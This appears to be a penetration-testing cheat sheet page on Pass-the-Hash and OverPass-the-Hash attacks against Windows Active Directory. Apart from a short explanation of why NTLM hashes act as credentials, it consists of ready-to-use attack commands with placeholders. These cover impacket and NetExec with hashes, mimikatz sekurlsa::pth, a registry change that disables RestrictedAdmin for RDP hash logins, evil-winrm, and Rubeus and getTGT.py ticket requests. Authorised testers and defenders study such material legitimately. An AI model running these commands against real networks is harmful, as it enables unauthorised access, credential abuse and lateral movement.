# Pass the Hash

You rarely need to crack a hash to use it. Pass-the-Hash authenticates over NTLM with the hash itself; OverPass-the-Hash (pass-the-key) converts the hash into a Kerberos TGT so you can move in a Kerberos-only environment.

## Why It Works

NTLM authentication proves knowledge of the hash, not the password — so the hash is the credential. Kerberos key derivation likewise starts from the hash, so a captured hash requests tickets just as a password would.

## Prerequisites

* An NT hash for an account with rights on the target
* SMB or Kerberos reachable on the target

## Execution

**NT Hash**

* Pass the Hash
  * MSSQL/PseudoShell PsExec/SMB...
    * `impacket : same as with creds, but use -hashes ':<hash>'` [\[tool\]](https://github.com/fortra/impacket)
      * **→ Admin**
    * `nxc : same as with creds, but use -H ':<hash>'` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * `mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
    * **→ Admin**
  * RDP
    * `reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/reg.py)
      * `xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>` [\[tool\]](https://linux.die.net/man/1/xfreerdp)
        * **→ Low access**
        * **→ Admin**
  * WinRM
    * `evil-winrm -i <ip> -u <user> -H <hash>` [\[tool\]](https://github.com/Hackplayers/evil-winrm)
      * **→ Low access**
      * **→ Admin**
* Overpass the Hash / Pass the key (PTK)
  * `Rubeus.exe asktgt /user:victim /rc4:<rc4value>` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `Rubeus.exe ptt /ticket:<ticket>` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]` [\[tool\]](https://github.com/GhostPack/Rubeus)
      * **→ Admin**
  * `getTGT.py <domain>/<user> -hashes :<hashes>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)

## Related

* [Remote Execution](file:///9685693/lateral-movement/remote-execution.md) — the same targets with a cleartext password
* [Pass-the-Certificate](file:///9685693/lateral-movement/pass-the-certificate.md) — the certificate-based equivalent
